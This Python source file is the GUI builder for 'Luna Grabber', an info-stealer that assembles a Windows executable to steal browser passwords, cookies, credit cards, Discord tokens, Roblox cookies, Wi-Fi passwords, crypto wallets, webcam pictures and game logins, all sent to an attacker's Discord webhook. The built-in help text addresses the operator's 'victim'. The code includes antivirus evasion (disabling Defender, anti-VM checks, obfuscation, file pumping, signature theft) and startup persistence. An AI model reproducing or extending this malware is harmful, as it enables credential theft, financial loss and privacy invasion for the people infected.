import copy
import customtkinter as ctk
import logging
import os
import random
import requests
import shutil
import string
import subprocess
import sys
import threading
import time
from PIL import Image
from tkinter import filedialog
from tools import upx
from tools.sigthief import signfile


logging.basicConfig(
    level=logging.DEBUG,
    filename='luna.log',
    filemode='a',
    format='[%(filename)s:%(lineno)d] - %(asctime)s - %(levelname)s - %(message)s'
)

logger = logging.getLogger(__name__)

class App(ctk.CTk):
    def __init__(self):
        super().__init__()

        self.title(f"Luna Grabber Builder - Running on v{sys.version.split()[0]}")
        self.geometry("1000x550")
        self.resizable(False, False)
        self.grid_rowconfigure(0, weight=1)
        self.grid_columnconfigure(1, weight=1)
        ctk.set_appearance_mode("system")

        self.updated_dictionary = {
            "webhook": None,
            "ping": False,
            "pingtype": None,
            "fakeerror": False,
            "startup": False,
            "defender": False,
            "systeminfo": False,
            "common_files": False,
            "browser": False,
            "roblox": False,
            "obfuscation": False,
            "injection": False,
            "wifi": False,
            "antidebug_vm": False,
            "discord": False,
            "anti_spam": False,
            "self_destruct": False,
            "clipboard": False,
            "webcam": False,
            "games": False
        }

        image_path = os.path.join(os.path.dirname(os.path.realpath(__file__)), "./gui_images/")
        self.basefilepath = os.path.dirname(str(os.path.realpath(__file__)))
        self.logo_image = ctk.CTkImage(Image.open(os.path.join(image_path, "luna.png")), size=(60, 60))
        self.large_test_image = ctk.CTkImage(Image.open(os.path.join(image_path, "luna.png")), size=(500, 150))
        self.image_icon_image = ctk.CTkImage(Image.open(os.path.join(image_path, "luna.png")), size=(20, 20))
        self.dashboard_image = ctk.CTkImage(dark_image=Image.open(os.path.join(image_path, "home.png")), size=(30, 30))
        self.docs_image = ctk.CTkImage(dark_image=Image.open(os.path.join(image_path, "clipboard.png")), size=(30, 30))
        self.help_image = ctk.CTkImage(dark_image=Image.open(os.path.join(image_path, "help.png")), size=(20, 20))
        self.font = "Supernova"
        self.iconpath = None
        self.iconbitmap(f"{image_path}luna.ico")
        self.boundExePath = ""

        self.navigation_frame = ctk.CTkFrame(self, corner_radius=0)
        self.navigation_frame.grid(row=0, column=0, sticky="nsew")
        self.navigation_frame.grid_rowconfigure(4, weight=1)

        self.navigation_frame_label = ctk.CTkLabel(self.navigation_frame, text="  Luna Grabber Builder", image=self.logo_image,
                                                             compound="left", font=ctk.CTkFont(size=15, weight="bold", family=self.font))
        self.navigation_frame_label.grid(row=0, column=0, padx=20, pady=20)

        self.dashboard_button = ctk.CTkButton(self.navigation_frame, corner_radius=0, height=40, border_spacing=10, text="Builder",
                                                        font=ctk.CTkFont(family=self.font, size=13), fg_color="transparent",
                                                        text_color=("gray10", "gray90"), hover_color=("gray70", "gray30"),
                                                        image=self.dashboard_image, anchor="w", command=self.home_button_event)
        self.dashboard_button.grid(row=1, column=0, sticky="ew")

        self.frame_2_button = ctk.CTkButton(self.navigation_frame, corner_radius=0, height=40, border_spacing=10, text="Documentation", font=ctk.CTkFont(
            family=self.font, size=13), fg_color="transparent", text_color=("gray10", "gray90"), hover_color=("gray70", "gray30"), image=self.docs_image, anchor="w", command=self.docs_button_event)
        self.frame_2_button.grid(row=2, column=0, sticky="ew")

        self.builder_frame = ctk.CTkFrame(self, corner_radius=0, fg_color="transparent")
        self.builder_frame.grid_columnconfigure(0, weight=1)

        # Frame 1

        self.webhook_button = ctk.CTkEntry(self.builder_frame, width=570, height=35, font=ctk.CTkFont(
            size=15, family=self.font), placeholder_text="https://discord.com/api/webhooks/1234567890/abcdefhgijklmnopqrstuvwxyz")
        self.webhook_button.grid(row=0, column=0, sticky="nw", padx=15, pady=20)

        self.checkwebhook_button = ctk.CTkButton(master=self.builder_frame, width=100, height=35, text="Check Webhook",
                                                           command=self.check_webhook_button,
                                                           fg_color="#5d11c3", hover_color="#5057eb", font=ctk.CTkFont(size=15, family=self.font))
        self.checkwebhook_button.grid(row=0, sticky="ne", padx=15, pady=20)

        self.all_options = ctk.CTkLabel(self.builder_frame, text="Builder Options", font=ctk.CTkFont(size=35, weight="bold", family=self.font))
        self.all_options.grid(row=1, column=0, sticky="n", padx=15, pady=8)

        self.option_help = ctk.CTkButton(self.builder_frame, width=12, text="", image=self.help_image,
                                                   command=self.docs_button_event, fg_color="#5d11c3", hover_color="#5057eb")
        self.option_help.grid(row=1, column=0, sticky="ne", padx=35, pady=15)

        self.ping = ctk.CTkCheckBox(self.builder_frame, text="Ping", font=ctk.CTkFont(size=17, family=self.font),
                                              command=self.check_ping, fg_color="#5d11c3", hover_color="#5057eb")
        self.ping.grid(row=1, column=0, sticky="nw", padx=85, pady=150)

        self.pingtype = ctk.CTkOptionMenu(
            self.builder_frame, width=20, values=["Everyone", "Here"],
            font=ctk.CTkFont(size=17, family=self.font),
            fg_color="#5d11c3", button_hover_color="#5057eb", button_color="#480c96")
        self.pingtype.set(value="Here")
        self.pingtype.grid(row=1, column=0, sticky="nw", padx=160, pady=148)
        self.pingtype.configure(state="disabled")

        self.error = ctk.CTkCheckBox(self.builder_frame, text="Fake Error", font=ctk.CTkFont(
            size=17, family=self.font), fg_color="#5d11c3", hover_color="#5057eb")
        self.error.grid(row=1, column=0, sticky="nw", padx=85, pady=105)

        self.startup = ctk.CTkCheckBox(
            self.builder_frame, text="Add To Startup", font=ctk.CTkFont(size=17, family=self.font),
            fg_color="#5d11c3", hover_color="#5057eb")
        self.startup.grid(row=1, column=0, sticky="nw", padx=85, pady=60)

        self.defender = ctk.CTkCheckBox(
            self.builder_frame, text="Disable Defender", font=ctk.CTkFont(size=17, family=self.font),
            fg_color="#5d11c3", hover_color="#5057eb")
        self.defender.grid(row=1, column=0, sticky="nw", padx=286, pady=60)

        self.games = ctk.CTkCheckBox(
            self.builder_frame, text="Games", font=ctk.CTkFont(size=17, family=self.font),
            fg_color="#5d11c3", hover_color="#5057eb")
        self.games.grid(row=1, column=0, sticky="nw", padx=286, pady=105)

        self.antidebug_vm = ctk.CTkCheckBox(
            self.builder_frame, text="Anti Debug/Vm", font=ctk.CTkFont(size=17, family=self.font),
            fg_color="#5d11c3", hover_color="#5057eb")
        self.antidebug_vm.grid(row=1, column=0, sticky="nw", padx=286, pady=150)

        self.discord = ctk.CTkCheckBox(
            self.builder_frame, text="Discord Info", font=ctk.CTkFont(size=17, family=self.font),
            fg_color="#5d11c3", hover_color="#5057eb")
        self.discord.grid(row=1, column=0, sticky="ne", padx=110, pady=60)

        self.wifi = ctk.CTkCheckBox(self.builder_frame, text="Wifi Info", font=ctk.CTkFont(size=17, family=self.font),
                                              fg_color="#5d11c3", hover_color="#5057eb")
        self.wifi.grid(row=1, column=0, sticky="ne", padx=130, pady=105)

        self.systeminfo = ctk.CTkCheckBox(
            self.builder_frame, text="System Info", font=ctk.CTkFont(size=17, family=self.font),
            fg_color="#5d11c3", hover_color="#5057eb")
        self.systeminfo.grid(row=1, column=0, sticky="nw", padx=85, pady=195)

        self.common_files = ctk.CTkCheckBox(
            self.builder_frame, text="Common Files", font=ctk.CTkFont(size=17, family=self.font),
            fg_color="#5d11c3", hover_color="#5057eb")
        self.common_files.grid(row=1, column=0, sticky="nw", padx=286, pady=195)

        self.browser = ctk.CTkCheckBox(
            self.builder_frame, text="Browser Info", font=ctk.CTkFont(size=17, family=self.font),
            fg_color="#5d11c3", hover_color="#5057eb", command=self.check_browser)
        self.browser.grid(row=1, column=0, sticky="ne", padx=107, pady=195)

        self.roblox = ctk.CTkCheckBox(self.builder_frame, text="Roblox Info", font=ctk.CTkFont(size=17, family=self.font),
                                                fg_color="#5d11c3", hover_color="#5057eb", command=self.check_roblox)
        self.roblox.grid(row=1, column=0, sticky="nw", padx=85, pady=240)

        self.obfuscation = ctk.CTkCheckBox(
            self.builder_frame, text="Obfuscation", font=ctk.CTkFont(size=17, family=self.font),
            fg_color="#5d11c3", hover_color="#5057eb", command=self.check_obfuscation)
        self.obfuscation.grid(row=1, column=0, sticky="nw", padx=286, pady=240)

        self.injection = ctk.CTkCheckBox(
            self.builder_frame, text="Injection", font=ctk.CTkFont(size=17, family=self.font),
            fg_color="#5d11c3", hover_color="#5057eb")
        self.injection.grid(row=1, column=0, sticky="ne", padx=130, pady=240)

        self.antispam = ctk.CTkCheckBox(self.builder_frame, text="Anti Spam", font=ctk.CTkFont(size=17, family=self.font),
                                                  fg_color="#5d11c3", hover_color="#5057eb")
        self.antispam.grid(row=1, column=0, sticky="nw", padx=85, pady=285)

        self.self_destruct = ctk.CTkCheckBox(self.builder_frame, text="Self Destruct", font=ctk.CTkFont(size=17, family=self.font),
                                                       fg_color="#5d11c3", hover_color="#5057eb")
        self.self_destruct.grid(row=1, column=0, sticky="nw", padx=286, pady=285)

        self.pump = ctk.CTkCheckBox(self.builder_frame, text="File Pumper", font=ctk.CTkFont(size=17, family=self.font),
                                              fg_color="#5d11c3", hover_color="#5057eb", command=lambda: (self.check_pumper(), self.check_pump()))
        self.pump.grid(row=1, column=0, sticky="ne", padx=112, pady=285)

        self.pump_size = ctk.CTkOptionMenu(self.builder_frame, width=30, font=ctk.CTkFont(
            size=17, family=self.font), values=["5mb", "10mb", "15mb", "20mb", "25mb", "30mb"], fg_color="#5d11c3", button_hover_color="#5057eb", button_color="#480c96")
        self.pump_size.grid(row=1, column=0, sticky="ne", padx=28, pady=284)
        self.pump_size.set("10mb")
        self.pump_size.configure(state="disabled")

        self.clipboard = ctk.CTkCheckBox(self.builder_frame, text="Clipboard", font=ctk.CTkFont(size=17, family=self.font),
                                                fg_color="#5d11c3", hover_color="#5057eb")
        self.clipboard.grid(row=1, column=0, sticky="nw", padx=85, pady=328)
        
        self.webcam = ctk.CTkCheckBox(self.builder_frame, text="Webcam", font=ctk.CTkFont(size=17, family=self.font),
                                                fg_color="#5d11c3", hover_color="#5057eb")
        self.webcam.grid(row=1, column=0, sticky="nw", padx=286, pady=328)

        self.wallets = ctk.CTkCheckBox(self.builder_frame, text="Wallets", font=ctk.CTkFont(size=17, family=self.font),
                                              fg_color="#5d11c3", hover_color="#5057eb", command=lambda: (self.check_pumper(), self.check_pump()))
        self.wallets.grid(row=1, column=0, sticky="ne", padx=130, pady=328)

        self.fileopts = ctk.CTkOptionMenu(self.builder_frame, values=["nuitka (.exe)", "pyinstaller (.exe)", ".py"],
                                                    font=ctk.CTkFont(size=32, family=self.font), width=250, height=45,
                                                    fg_color="#5d11c3", button_hover_color="#5057eb", button_color="#480c96", command=self.file_type_check)
        self.fileopts.grid(row=1, column=0, sticky="nw", padx=85, pady=365)
        self.fileopts.set("nuitka (.exe)")

        self.icon = ctk.CTkButton(self.builder_frame, width=250, text="Add Icon", fg_color="#5d11c3", hover_color="#5057eb",
                                            font=ctk.CTkFont(size=33, family=self.font), command=self.get_icon)
        self.icon.grid(row=1, column=0, sticky="ne", padx=85, pady=365)
        self.icon.configure(state="enabled")

        self.filename = ctk.CTkEntry(self.builder_frame, width=250, font=ctk.CTkFont(size=33, family=self.font),
                                               placeholder_text="File Name")
        self.filename.grid(row=1, column=0, sticky="nw", padx=85, pady=420)

        self.build = ctk.CTkButton(self.builder_frame, width=250, text="Build", font=ctk.CTkFont(size=35, family=self.font),
                                             fg_color="#5d11c3", hover_color="#5057eb", command=self.buildfile)
        self.build.grid(row=1, column=0, sticky="ne", padx=85, pady=420)
        
        self.checkboxes = [self.ping, self.pingtype, self.error, self.startup, self.defender, self.systeminfo, self.common_files, self.browser, self.webcam,
                           self.roblox, self.obfuscation, self.injection, self.wifi, self.games, self.antidebug_vm, self.discord, self.clipboard,
                           self.antispam, self.self_destruct, self.pump, self.wallets]

        # Frame 2

        self.second_frame = ctk.CTkFrame(self, corner_radius=0, fg_color="transparent")
        self.second_frame.grid_columnconfigure(0, weight=1)

        self.docs = ctk.CTkLabel(self.second_frame, text="Documentation", font=ctk.CTkFont(size=35, weight="bold", family=self.font))
        self.docs.grid(row=1, column=0, sticky="n", padx=0, pady=10)

        self.docsbox = ctk.CTkTextbox(self.second_frame, width=725, height=485, font=ctk.CTkFont(size=12, weight="bold", family=self.font))
        self.docsbox.grid(row=1, column=0, sticky="n", padx=0, pady=55)
        self.docsbox.insert(
            "0.0",
            """
Add To Startup:\n
This will add the file to the startup folder of the user so when they turn their pc on the file will run and their information will \nbe sent to your webhook again.\n\n
Fake Error:\nThis will make a fake error popup when the file is ran to make confuse the victim.\n\n
Ping:\nThis will ping you at the moment when information is being sent to your webhook.\n\n
Ping Type:\nThere are two options: @everyone and @here. @everyone pings everyone that can access that channel and @here pings \nactive people in that channel\n\n
System Info:\nThis will get the user's pc information such as pc name, os, ip address, mac address, hwid, cpu, gpu and ram.\n\n
Common Files:\nSearches Desktop, Documents, Downloads folder for files containing sensitive information (like "secret", "password", etc.) or specific file extensions (.txt, .pdf, etc.), excluding shortcuts.\n\n
Browser Info:\nThis will get the user's browser such as browser passwords, history, cookies and credit cards.\n\n
Roblox Info:\nThis will get the user's roblox information like there username, roblox cookie and the amount of robux they have.\n\n
Obfuscation:\nThis will obfuscate the file which means the source code will be unreadable and it will be hard for your victim's to delete or \nspam your webhook.\n\n
Injection:\nThis will inject a script into your victim's discord which means when they change any credentials you will recieve their \npassword and token to that discord account.\n\n
Wifi Info:\nThis will get the user's wifi information such as wifi passwords and wifi networks.\n\n
Games:\nThis will currently steal Epic and Minecraft logins.\n\n
Anti-Debug VM:\nThis will check if the user is using a virtual machine or if they are debugging this script and it will exit out to stop them.\n\n
Discord Info:\nThis will send you all the discord information for every account they have. This info consists of their email, phone number, if \nthey have 2fa enabled, if they have nitro and what type of nitro, token and any gift cards.\n\n
Anti Spam:\nOnly allows the victim to open the file every 60 seconds so your webhook isnt rate limited or spammed.\n\n
Self Destruct:\nDeletes the file once it has ran so the victim can't run it again.\n\n
File Pumper:\nAdds more megabytes to the file to make the file appear to be something its not and also tricks some antiviruses.\n\n
Clipboard:\nRetrieves the last thing they copied onto their clipboard.\n\n
Webcam:\nTakes one picture with each attached webcam.\n\n
Wallets:\nSteals the crypto wallets from the user.\n\n
Build Options:\n
Pyinstaller - Builds a standalone executable file with the necessary modules inside of it.\nAdvantages: Single file, fast compilation time, easy to transfer.\nDisadvantages: Detected by antiviruses, large file size\n
Nuitka - Builds a standalone executable file with the necessary modules inside of it.\nAdvantages: Smaller than PyInstaller and way faster.\nDisadvantages: Detected by antiviruses, longer buildtimes.
            """)

        self.select_frame_by_name("home")

    def select_frame_by_name(self, name):
        self.dashboard_button.configure(fg_color=("gray75", "gray25") if name == "home" else "transparent")
        self.frame_2_button.configure(fg_color=("gray75", "gray25") if name == "frame_2" else "transparent")

        if name == "home":
            self.builder_frame.grid(row=0, column=1, sticky="nsew")
        else:
            self.builder_frame.grid_forget()
        if name == "frame_2":
            self.second_frame.grid(row=0, column=1, sticky="nsew")
        else:
            self.second_frame.grid_forget()

    def home_button_event(self):
        self.select_frame_by_name("home")

    def docs_button_event(self):
        self.select_frame_by_name("frame_2")

    def verify_webhook(self):
        webhook = self.webhook_button.get()
        try:
            r = requests.get(webhook, timeout=5)
            if r.status_code == 200:
                return True
            else:
                logging.error(f"Webhook not valid. Status code: {r.status_code}. Webhook: {webhook}")
                return False
        except Exception as e:
            logging.error(f"Couldn't verify webhook: {e}")
            return False

    def check_webhook_button(self):
        if self.verify_webhook():
            self.checkwebhook_button.configure(width=100, height=35, fg_color="green", hover_color="#0db60e",
                                               text="Valid Webhook", font=ctk.CTkFont(size=15, family=self.font))
            self.builder_frame.after(3500, self.reset_check_webhook_button)
            self.updated_dictionary["webhook"] = self.webhook_button.get()
        else:
            self.checkwebhook_button.configure(width=100, height=35, fg_color="#bd1616", hover_color="#ff0000",
                                               text="Invalid Webhook", font=ctk.CTkFont(size=15, family=self.font))
            self.builder_frame.after(3500, self.reset_check_webhook_button)

    def check_ping(self):
        if self.ping.get() == 1:
            self.pingtype.configure(state="normal")
        else:
            self.pingtype.configure(state="disabled")

    def check_pumper(self):
        if self.pump.get() == 1:
            self.pump_size.configure(state="normal")
        else:
            self.pump_size.configure(state="disabled")

    def get_mb(self):
        self.mb = self.pump_size.get()
        byte_size = int(self.mb.replace("mb", ""))
        return byte_size

    def check_roblox(self):
        if self.roblox.get() == 1:
            self.browser.select()
            
    def check_browser(self):
        if self.browser.get() == 0:
            self.roblox.deselect()

    def check_obfuscation(self):
        if self.obfuscation.get() == 1:
            self.pump.deselect()

    def check_pump(self):
        if self.pump.get() == 1:
            self.obfuscation.deselect()

    def file_type_check(self, _):
        if self.fileopts.get() in ["pyinstaller (.exe)", "nuitka (.exe)"]:
            self.icon.configure(state="normal")
            self.startup.configure(state="normal")
            self.pump.configure(state="normal")
        elif self.fileopts.get() == ".py":
            self.icon.configure(state="disabled")
            self.startup.configure(state="disabled")
            self.startup.deselect()
            self.pump.configure(state="disabled")
            self.pump.deselect()

    def get_icon(self):
        REMOVE = "Remove Icon"
        ADD = "Add Icon"
        
        buttonText = self.icon.cget("text")
        
        if buttonText == ADD:
            user_pictures_dir = os.path.join(os.path.expanduser("~"), "Pictures")
            allowedFiletypes = [("Image Files", ["*.ico", "*.bmp", "*.gif", "*.jpeg", "*.png", "*.tiff", "*.webp"])]
            filePath = filedialog.askopenfilename(initialdir=user_pictures_dir, title="Select Icon", filetypes=allowedFiletypes)
            if os.path.isfile(filePath):
                try:
                    with Image.open(filePath) as image:
                        image.save("build_icon.ico", format="ico")
                    self.iconpath = "build_icon.ico"

                except Exception:
                    logging.error("Error", "Unable to convert the image to icon!")
                else:
                    self.icon.configure(text=REMOVE)            

        elif buttonText == REMOVE:
            self.iconpath = None
            self.icon.configure(text=ADD)

    def update_config(self):
        checkbox_mapping = {
            "webhook": self.webhook_button,
            "ping": self.ping,
            "pingtype": self.pingtype,
            "fakeerror": self.error,
            "startup": self.startup,
            "defender": self.defender,
            "systeminfo": self.systeminfo,
            "common_files": self.common_files,
            "browser": self.browser,
            "roblox": self.roblox,
            "obfuscation": self.obfuscation,
            "injection": self.injection,
            "wifi": self.wifi,
            "antidebug_vm": self.antidebug_vm,
            "discord": self.discord,
            "anti_spam": self.antispam,
            "self_destruct": self.self_destruct,
            "clipboard": self.clipboard,
            "webcam": self.webcam,
            "wallets": self.wallets,
            "games": self.games
        }

        for key, checkbox in checkbox_mapping.items():
            try:
                if checkbox.get():
                    if key == "webhook":
                        self.updated_dictionary[key] = self.webhook_button.get()
                    else:
                        self.updated_dictionary[key] = True
                elif checkbox.get() == 0:
                    self.updated_dictionary[key] = False
                ping_message = self.pingtype.get()
                if ping_message in ["Here", "Everyone"]:
                    self.updated_dictionary["pingtype"] = ping_message
                elif self.ping.get() == 0:
                    self.updated_dictionary["pingtype"] = "None"
            except Exception as e:
                logging.error(f"Error with updating config: {e}")

    def get_filetype(self):
        try:
            file_type = self.fileopts.get()
            if file_type == ".py":
                logging.info(f"Changed filetype: {file_type}")
                return file_type.replace(".", "")
            else:
                logging.info(f"Changed filetype: {file_type}")
                return file_type
        except Exception as e:
            logging.error(f"Error with getting filetype: {e}")

    def reset_check_webhook_button(self):
        self.checkwebhook_button.configure(fg_color="#5d11c3", hover_color="#5057eb", text="Check Webhook")

    def building_button_thread(self, thread):
        while thread.is_alive():
            for i in [".", "..", "..."]:
                self.build.configure(width=250, text=f"Building{i}", font=ctk.CTkFont(size=35, family=self.font), fg_color="#5d11c3", hover_color="#5057eb")
                time.sleep(0.3)
                self.update()

    def return_filename(self):
        try:
            get_file_name = self.filename.get().replace(" ", "-")
            if not get_file_name:
                random_name = ''.join(random.choices(string.ascii_letters, k=5))
                logging.info(f"Retrieved filename: test-{random_name}")
                return f"test-{random_name}"
            else:
                logging.info(f"Retrieved filename: {get_file_name}")
                return get_file_name
        except Exception as e:
            logging.error(f"Error with getting filename: {e}")

    def get_config(self):
            options = self.basefilepath + "\\options\\"
            try:
                with open(self.basefilepath + "\\luna.py", 'r', encoding="utf-8") as f:
                    code = f.read()

                copy_dict = copy.deepcopy(self.updated_dictionary)
                config_str = f"""__CONFIG__ = {repr(copy_dict)}"""
                code = f"{config_str}\n\n{code}"
                
                if self.updated_dictionary["anti_spam"]:
                    with open(options+"AntiSpam.py", "r", encoding="utf-8") as f:
                        code += f.read()
                        code += "\n\n"
                
                if self.updated_dictionary["common_files"]:
                    with open(options+"CommonFiles.py", "r", encoding="utf-8") as f:
                        code += f.read()
                        code += "\n\n"
                
                if self.updated_dictionary["browser"]:
                    with open(options+"Browsers.py", "r", encoding="utf-8") as f:
                        code += f.read()
                        code += "\n\n"
                
                if self.updated_dictionary["clipboard"]:
                    with open(options+"Clipboard.py", "r", encoding="utf-8") as f:
                        code += f.read()
                        code += "\n\n"
                
                if self.updated_dictionary["antidebug_vm"]:
                    with open(options+"Debug.py", "r", encoding="utf-8") as f:
                        code += f.read()
                        code += "\n\n"
                
                if self.updated_dictionary["defender"]:
                    with open(options+"Disable_defender.py", "r", encoding="utf-8") as f:
                        code += f.read()
                        code += "\n\n"
                
                if self.updated_dictionary["discord"]:
                    with open(options+"Discord.py", "r", encoding="utf-8") as f:
                        code += f.read()
                        code += "\n\n"
                
                if self.updated_dictionary["fakeerror"]:
                    with open(options+"Fake_error.py", "r", encoding="utf-8") as f:
                        code += f.read()
                        code += "\n\n"
                
                if self.updated_dictionary["injection"]:
                    with open(options+"Injection.py", "r", encoding="utf-8") as f:
                        code += f.read()
                        code += "\n\n"
                
                if self.updated_dictionary["systeminfo"]:
                    with open(options+"System.py", "r", encoding="utf-8") as f:
                        code += f.read()
                        code += "\n\n"
                
                if self.updated_dictionary["self_destruct"]:
                    with open(options+"SelfDestruct.py", "r", encoding="utf-8") as f:
                        code += f.read()
                        code += "\n\n"
                
                if self.updated_dictionary["startup"]:
                    with open(options+"Startup.py", "r", encoding="utf-8") as f:
                        code += f.read()
                        code += "\n\n"
                
                if self.updated_dictionary["wifi"]:
                    with open(options+"Wifi.py", "r", encoding="utf-8") as f:
                        code += f.read()
                        code += "\n\n"	
                        
                if self.updated_dictionary["webcam"]:
                    with open(options+"Webcam.py", "r", encoding="utf-8") as f:
                        code += f.read()
                        code += "\n\n"
                
                if self.updated_dictionary["wallets"]:
                    with open(options+"Wallets.py", "r", encoding="utf-8") as f:
                        code += f.read()
                        code += "\n\n"

                if self.updated_dictionary["games"]:
                    with open(options+"Games.py", "r", encoding="utf-8") as f:
                        code += f.read()
                        code += "\n\n"

                code += """if __name__ == '__main__' and os.name == "nt":
    Luna(__CONFIG__["webhook"])
                """

                # Remove duplicate imports
                lines = code.split('\n')
                unique_lines = []
                imported_modules = set()
                
                for line in lines:
                    if line.startswith("import ") or line.startswith("from "):
                        module_name = line.split()[1]
                        if module_name not in imported_modules:
                            unique_lines.append(line)
                            imported_modules.add(module_name)
                    else:
                        unique_lines.append(line)	
                cleaned_code = '\n'.join(unique_lines)

                logging.info("Successfully changed config")
                return cleaned_code
            except Exception as e:
                logging.error(f"Error with config: {e}")

    def file_pumper(self, filename, extension, size):
        try:
            pump_size = size * 1024 ** 2
            with open(f"./{filename}.{extension}", 'ab') as f:
                for _ in range(int(pump_size)):
                    f.write((b'\x00'))
            logging.info(f"Successfully pumped file: {filename}.{extension}")
        except Exception as e:
            logging.error(f"Error with file pumper: {e}")

    def compile_file(self, filename, filetype):
        try:
            if self.iconpath is None:
                exeicon = "NONE"
            else:
                exeicon = self.iconpath
            
            included_modules_nuitka = [
                "concurrent.futures",
                "requests",
                "requests_toolbelt"
            ]
            
            option_module_mapping_nuitka = {
                "browser": ["psutil", "sqlite3", "win32crypt", "Cryptodome.Cipher.AES"],
                "clipboard": ["pyperclip"],
                "antidebug_vm": ["psutil"],
                "discord": ["Cryptodome.Cipher.AES", "PIL.ImageGrab", "win32crypt"],
                "injection": ["psutil"],
                "systeminfo": ["psutil"]
            }
            
            included_modules_pyinstaller = [
                "json",
                "requests_toolbelt",
                "sys",
                "ctypes"
                ]
            
            option_module_mapping_pyinstaller = {
                "anti_spam": ["time"],
                "common_files": ["shutil"],
                "browser": ["sqlite3", "win32crypt", "Cryptodome.Cipher.AES", "base64", "psutil", "typing"],
                "clipboard": ["pyperclip"],
                "antidebug_vm": ["psutil", "subprocess"],
                "defender": ["subprocess", "base64"],
                "discord": ["Cryptodome.Cipher.AES", "PIL.ImageGrab", "win32crypt", "base64", "re"],
                "injection": ["subprocess", "psutil", "re"],
                "systeminfo": ["psutil", "subprocess", "pycountry"],
                "self_destruct": ["subprocess"],
                "wifi": ["subprocess"],
                "webcam": ["cv2"],
                "startup": ["shutil", "subprocess"],
                "games": ["subprocess"]
            }

            if filetype == "pyinstaller":
                upx.UPX()

                included_modules = included_modules_pyinstaller
                option_module_mapping = option_module_mapping_pyinstaller
            
                for option, enabled in self.updated_dictionary.items():
                    if enabled and option in option_module_mapping:
                        included_modules.extend(option_module_mapping[option])
            
                command = [
                    sys.executable, "-m", "PyInstaller",
                    "--onefile", "--clean", "--noconsole",
                    "--upx-dir=./tools", "--distpath=./",
                    "--icon", exeicon, f"./{filename}.py"
                ]
            
                for module in included_modules:
                    command.insert(-1, "--hidden-import")
                    command.insert(-1, module)

                subprocess.run(command)
                
                os.remove(f"./{filename}.py")
                self.PostProcessing(f"./{filename}.exe")

                logging.info(f"Successfully compiled {filename}.exe with pyinstaller")
                print(f"Successfully compiled {filename}.exe with pyinstaller")

            elif filetype == "nuitka":
                if sys.version_info[:2] > (3, 11):
                    print("Nuitka does not support Python 3.12")
                    logging.error("Nuitka does not support Python 3.12")
                    return
                else:
                    command = [
                        sys.executable, "-m", "nuitka",
                        "--onefile", "--standalone", "--remove-output",
                        "--show-progress", "--prefer-source-code",
                        "--assume-yes-for-downloads", "--windows-disable-console",
                        f"./{filename}.py"
                    ]          
                    try:
                        for option, enabled in self.updated_dictionary.items():
                            if enabled and option in option_module_mapping_nuitka:
                                included_modules_nuitka.extend(option_module_mapping_nuitka[option])			
                        for module in included_modules_nuitka:
                            command.insert(-1, f"--include-module={module}")	
                            
                        if exeicon != "NONE":
                            command.insert(-1, f"--windows-icon-from-ico={exeicon}")
                            
                        subprocess.run(command)
                        
                        os.remove(f"./{filename}.py")
                        self.PostProcessing(f"./{filename}.exe")
                        
                        logging.info(f"Successfully compiled {filename}.exe with nuitka")
                        print(f"Successfully compiled {filename}.exe with nuitka")
                    except Exception as e:
                        logging.error(f"Error with compiling file: {e}")
                        print(f"Error with compiling file: {e}")
                        
        except Exception as e:
            logging.error(f"Error with compiling file: {e}")
            print(f"Error with compiling file: {e}")

    def cleanup_files(self, filename):
        cleans_dir = {'./__pycache__', './build'}
        cleans_file = {f'./{filename}.spec', "./tools/upx.exe", "build_icon.ico"}

        for clean in cleans_dir:
            try:
                if os.path.isdir(clean):
                    shutil.rmtree(clean)
                    logging.info(f"Successfully removed directory: {clean}")
            except Exception as e:
                logging.error(f"Couldn't remove directory: {clean}. {e}")
                pass
                continue
        for clean in cleans_file:
            try:
                if os.path.isfile(clean):
                    os.remove(clean)
                    logging.info(f"Successfully removed file: {clean}")
            except Exception as e:
                logging.error(f"Couldn't remove file: {clean}. {e}")
                pass
                continue

    def write_and_obfuscate(self, filename):
        def generate_name():
            return '_%s' % ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(8, 20)))
        
        def _junk(path: str) -> None:
            with open(path) as file:
                code = file.read()
            junk_funcs = [generate_name() for _ in range(random.randint(25, 40))]
            junk_func_calls = junk_funcs.copy()
            
            junk_code = """
class %s:
    def __init__(self):
            """.strip() % generate_name()
        
            junk_code += "".join(["\n%sself.%s(%s)" % (" " * 8, x, ", ".join(["%s()" %generate_name() for _ in range(random.randint(1, 4))])) for x in junk_funcs])
        
            random.shuffle(junk_funcs)
            random.shuffle(junk_func_calls)
        
            junk_code += "".join(["\n%sdef %s(self, %s):\n%sself.%s()" % (" " * 4, junk_funcs[index], ", ".join([generate_name() for _ in range(random.randint(5, 20))]), " " * 8, junk_func_calls[index]) for index in range(len(junk_func_calls))])
        
            with open(path, "w") as file:
                file.write(code + "\n" + junk_code)
        
        try:
            with open(f"./{filename}.py", 'w', encoding="utf-8") as f:
                f.write(self.get_config())

            if self.obfuscation.get() == 1:
                _junk(f"./{filename}.py")
                os.system(f"\"{sys.executable}\" ./tools/obfuscation.py -i ./{filename}.py")
                os.remove(f"./{filename}.py")
                os.rename(f"./Obfuscated_{filename}.py", f"./{filename}.py")
                logging.info(f"Successfully obfuscated file: {filename}.py")
        except Exception as e:
            _message = f"Error with writing and obfuscating file: {e}"
            print(_message)
            logging.error(_message)

    def buildfile(self):
        if self.return_filename() == "nuitka":
            _message = "Invalid filename."
            logging.error(_message)
            print(_message)
            return
        if not self.verify_webhook():
            _message = "Webhook not valid. Aborting compilation."
            logging.error(_message)
            print(_message)
            self.checkwebhook_button.configure(width=100, height=35, fg_color="#bd1616", hover_color="#ff0000",
                                    text="Invalid Webhook", font=ctk.CTkFont(size=15, family=self.font))
            self.builder_frame.after(3500, self.reset_check_webhook_button)
            return
        
        filename = self.return_filename()
        self.update_config()
        self.write_and_obfuscate(filename)        
        
        try:
            if self.get_filetype() == "py":
                self.switchStateOfAll("disabled")
                
                if self.pump.get() == 1:
                    self.file_pumper(filename, "py", self.get_mb())


            elif self.get_filetype() == "pyinstaller (.exe)":
                self.switchStateOfAll("disabled")
                
                thread = threading.Thread(target=self.compile_file, args=(filename, "pyinstaller",))
                thread.start()
                self.building_button_thread(thread)

                if self.pump.get() == 1:
                    self.file_pumper(filename, "exe", self.get_mb())

            elif self.get_filetype() == "nuitka (.exe)": 
                self.switchStateOfAll("disabled")
                
                thread = threading.Thread(target=self.compile_file, args=(filename, "nuitka",))
                thread.start()
                self.building_button_thread(thread)

                if self.pump.get() == 1:
                    self.file_pumper(filename, "exe", self.get_mb())
          
            self.cleanup_files(filename)
            self.switchStateOfAll("normal")
            self.build.configure(text="Build")

        except Exception as e:
            logging.error(f"Error with building file: {e}")
            
